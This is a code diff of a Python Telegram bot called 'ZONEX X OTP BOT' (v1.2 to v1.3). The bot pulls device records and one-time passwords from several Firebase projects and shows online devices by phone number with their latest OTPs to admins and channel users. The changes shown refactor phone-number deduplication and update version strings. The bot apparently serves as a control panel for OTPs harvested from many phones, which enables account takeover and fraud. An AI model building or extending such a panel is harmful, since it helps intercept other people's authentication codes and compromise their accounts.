@@ -2,9 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║   ZONEX X OTP BOT (FILTERED v1.2)        ║
-║   Only Shows OTPs from Last 1 Hour       ║
-║   FIXED: Duplicate numbers removed       ║
+║   ZONEX X OTP BOT (FILTERED v1.3)        ║
+║   FIXED: Duplicate buttons completely    ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -366,7 +365,7 @@ def _extract_phone(info: dict) -> str:
     return "—"
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  ★★★ FIREBASE FETCH & 1-HOUR FILTER ★★★
+#  ★★★ FIREBASE FETCH & FILTER ★★★
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
@@ -507,7 +506,6 @@ def count_online() -> int:
     return len(all_online())
 
 def count_total() -> int:
-    # Unique phone numbers count
     seen = set()
     for dm in device_cache.values():
         for d in dm.values():
@@ -520,32 +518,21 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    """
-    ★ DEDUPLICATE BY PHONE NUMBER
-    Ek hi phone number sirf ek baar dikhega — sabse latest OTP wali entry.
-    """
-    best: dict = {}  # phone -> (lb, did, info, otps)
+    # ★ PERFECT DEDUPLICATE BY PHONE
+    best = {}
     for lb, dm in device_cache.items():
         for did, info in dm.items():
-            if not info.get("online"):
-                continue
+            if not info.get("online"): continue
             ph = info.get("phone", "—")
-            if ph == "—":
-                continue
+            if ph == "—": continue
             otps = otp_cache.get(lb, {}).get(did, [])
-            # Latest OTP timestamp for this device
-            latest_dt = None
-            if otps:
-                latest_dt = otps[0].get("_dt")
-            # Keep the one with latest OTP
-            existing = best.get(ph)
-            if existing is None:
+            latest_dt = otps[0].get("_dt") if otps else None
+            if ph not in best:
                 best[ph] = (lb, did, info, latest_dt)
             else:
-                ex_dt = existing[3]
+                ex_dt = best[ph][3]
                 if latest_dt and (ex_dt is None or latest_dt > ex_dt):
                     best[ph] = (lb, did, info, latest_dt)
-    # Return list of (lb, did, info)
     return [(lb, did, info) for (lb, did, info, _) in best.values()]
 
 def resolve_label(esc: str) -> str:
@@ -1270,8 +1257,9 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await asyncio.gather(*[_safe_clients(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
 
+        # ★★★ YAHAN DEDUPLICATE HO RAHA HAI ★★★
         devs = all_online()
-        total_online_all = count_online()
+        total_online_all = len(devs)
         total_devices_all = count_total()
 
         if not devs:
@@ -1361,7 +1349,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         lb    = resolve_label(esc)
         cfg   = next((c for c in data["firebase_configs"] if c["label"]==lb), None)
 
-        # ★ FRESH FETCH FROM FIREBASE
         if cfg:
             try:
                 fetched, _ = await fetch_otps(cfg["url"], cfg.get("key",""), did)
@@ -2461,7 +2448,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot (Filtered v1.2) starting...")
+    logger.info("🚀 ZONEX X OTP Bot (Filtered v1.3) starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
